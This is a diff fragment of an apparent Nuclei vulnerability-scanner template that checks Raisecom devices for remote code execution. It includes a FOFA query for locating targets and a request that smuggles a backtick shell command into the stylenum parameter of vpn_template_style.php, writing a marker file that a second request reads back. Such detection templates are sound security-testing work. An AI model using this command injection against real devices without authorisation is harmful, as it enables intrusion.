@@ -15,11 +15,9 @@ info:
     max-request: 2
     fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>"'
   tags: raisecom,rce,intrusive
-
 variables:
   string: "{{randstr}}"
   filename: "{{to_lower(rand_text_alpha(5))}}"
-
 flow: http(1) && http(2)
 
 http:
@@ -41,7 +39,6 @@ http:
       - |
         GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /tmp/{{filename}}.txt HTTP/1.1
         Host: {{Hostname}}
